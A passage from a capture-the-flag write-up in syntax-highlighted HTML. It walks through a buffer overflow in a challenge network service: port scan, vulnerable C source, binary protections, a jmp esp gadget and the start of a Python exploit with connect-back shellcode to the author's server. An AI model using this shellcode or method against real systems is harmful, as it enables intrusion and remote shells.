class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Upload successful.&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Executing post process...&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Post process result: Gnome Serial Number: BU22_1729_2716057
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-04
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;File pending Nedfords approval.&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;[snip]
&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="sg04_w00t.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg04_w00t.png" /&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;BU22_1729_2716057&lt;/code&gt;
(&lt;a class="reference external" href="https://en.wikipedia.org/wiki/Bender_%28Futurama%29"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id5"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://54.233.105.81/"&gt;SuperGnome05&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;This SuperGnome was particular: indeed, the vulnerability was not in the
web interface, but in a network service run by the SuperGnome. If we
take a look at the result of a &lt;code&gt;nmap&lt;/code&gt; command, we can see that
we can connect to the SuperGnome on the port 4242:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nmap &lt;span class="m"&gt;54&lt;/span&gt;.233.105.81

&lt;span class="go"&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2016-01-09 10:55 CET&lt;/span&gt;
&lt;span class="go"&gt;Nmap scan report for ec2-54-233-105-81.sa-east-1.compute.amazonaws.com (54.233.105.81)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.30s latency).&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 997 filtered ports&lt;/span&gt;
&lt;span class="go"&gt;PORT     STATE  SERVICE&lt;/span&gt;
&lt;span class="go"&gt;80/tcp   open   http&lt;/span&gt;
&lt;span class="go"&gt;4242/tcp open   vrml-multi-use&lt;/span&gt;
&lt;span class="go"&gt;5555/tcp closed freeciv&lt;/span&gt;

&lt;span class="go"&gt;Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's connect to it using &lt;code&gt;netcat&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nc &lt;span class="m"&gt;54&lt;/span&gt;.233.105.81 &lt;span class="m"&gt;4242&lt;/span&gt;

&lt;span class="go"&gt;Welcome to the SuperGnome Server Status Center!&lt;/span&gt;
&lt;span class="go"&gt;Please enter one of the following options:&lt;/span&gt;

&lt;span class="go"&gt;1 - Analyze hard disk usage&lt;/span&gt;
&lt;span class="go"&gt;2 - List open TCP sockets&lt;/span&gt;
&lt;span class="go"&gt;3 - Check logged in users&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, this seems to be a service to get some informations about
the SuperGnomes. Let's see if we have a copy of the binary
in our copy of the firmware&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep -Rn &lt;span class="s2"&gt;&amp;quot;Welcome to the SuperGnome Server Status Center&amp;quot;&lt;/span&gt; .

&lt;span class="go"&gt;Fichier binaire ./usr/bin/sgstatd correspondant&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, so the binary program listening on the port 4242 seems to
be &lt;code&gt;/usr/bin/sgstatd&lt;/code&gt;. If we look carefully, we can
find the source for such a program on SuperGnome01:&lt;/p&gt;
&lt;img alt="sg01_file_list.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg01_file_list.png" /&gt;
&lt;p&gt;You can download the source code &lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/sgnet.zip"&gt;here&lt;/a&gt;
(sha256: &lt;code&gt;2343ce7345b960144fcb39ca01c2cf406e6db9a7847eaae6361d69ef5169d4e4&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Now let's look at the source code, and see where our input
are being processed (I cleaned it up a bit):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// File sgstatd.c, line 21&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Welcome to the SuperGnome Server Status Center!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Please enter one of the following options:&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;1 - Analyze hard disk usage&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;2 - List open TCP sockets&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;3 - Check logged in users&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/df&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failed to run command&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;sgnet_writes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/netstat -tan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failed to run command&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;sgnet_writes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/usr/bin/who&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failed to run command&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;sgnet_writes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="mi"&gt;88&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
&lt;/span&gt;        &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;Hidden command detected!&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Enter a short message to share with GnomeNet (please allow 10 seconds) =&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="hll"&gt;        &lt;span class="n"&gt;sgstatd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There seems to be a hidden command when we input &lt;code&gt;88&lt;/code&gt;, which is the
ASCII code of the letter &lt;code&gt;X&lt;/code&gt;. If we input &lt;code&gt;X&lt;/code&gt;, the function
&lt;code&gt;sgstatd&lt;/code&gt; is called. Let's take a look at it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// File sgstatd.c, line 138&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;sgstatd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="n"&gt;__asm__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;movl $0xe4ffffe4, -4(%ebp)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;    &lt;span class="c1"&gt;//Canary pushed&lt;/span&gt;

    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;This function is protected!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;//recv(sd, &amp;amp;bin, 200, 0);&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="n"&gt;sgnet_readn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;    &lt;span class="n"&gt;__asm__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;movl -4(%ebp), %edx&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;xor $0xe4ffffe4, %edx&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;   &lt;span class="c1"&gt;// Canary checked&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;        &lt;span class="s"&gt;&amp;quot;jne sgnet_exit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, so the function &lt;code&gt;sgnet_readn&lt;/code&gt; seems to read data from the socket,
and stock it in a buffer. If we look at it, we can see that there is no
boundary checking. What's more, the buffer &lt;code&gt;bin&lt;/code&gt; only has 100 bytes
allocated, but the program reads and stores 200 bytes of data in it. Can
you say buffer-overflow!&lt;/p&gt;
&lt;p&gt;Let's take a look at the binary, to see what kind of security it as. i'm
using the &lt;code&gt;checksec.sh&lt;/code&gt; (available
&lt;a class="reference external" href="https://github.com/slimm609/checksec.sh"&gt;here&lt;/a&gt;) script to do so:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; /checksec --file sgstatd
&lt;span class="go"&gt;RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY FORTIFIED FORTIFY-able  FILE&lt;/span&gt;
&lt;span class="go"&gt;No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No  0       8   sgstatd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, make sure you run the script on the binary from the firmware, and not
on a binary you compiled from the source code.&lt;/p&gt;
&lt;p&gt;We can see that there is no stack canary, and that &lt;code&gt;NX&lt;/code&gt; is disabled.
This means that we can put our shellcode directly on the stack. Plus,
&lt;code&gt;PIE&lt;/code&gt; is also disabled, so we can use a gadget from our base code, and
its position will be the same on the distant binary.&lt;/p&gt;
&lt;p&gt;Also there is no stack canary, we can see in the code from the &lt;code&gt;sgstatd&lt;/code&gt;
function that there is a hardcoded canary: &lt;code&gt;0xe4ffffe4&lt;/code&gt;. We have to
have this value in our final payload.&lt;/p&gt;
&lt;p&gt;Now, let's find a &lt;code&gt;jmp esp&lt;/code&gt; gadget in our binary, so that we can continue
the flow of execution on the stack. The opcode for such an instruction is
&lt;code&gt;ff e4&lt;/code&gt;. If this value is familiar, it's because it's used in the custom
stack canary (clever organizers)!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; objdump -M intel -d sgstatd &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;ff e4&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt; 8049366:   c7 45 fc e4 ff ff e4    mov    DWORD PTR [ebp-0x4],0xe4ffffe4&lt;/span&gt;
&lt;span class="go"&gt; 80493b2:   81 f2 e4 ff ff e4       xor    edx,0xe4ffffe4&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, our &lt;code&gt;jmp esp&lt;/code&gt; gadget is available at the address &lt;code&gt;0x0804936b&lt;/code&gt;.
Let's see the exploit code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# This is a connect-back shellcode, configured to connect back&lt;/span&gt;
    &lt;span class="c1"&gt;# to a server I own, on the port 8080.&lt;/span&gt;
    &lt;span class="c1"&gt;# Thanks to http://shell-storm.org/shellcode/&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xcd\x80\x92\xb0\x66\x68\x51\x39\x0B\x02\x66\x68\x1f\x90&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
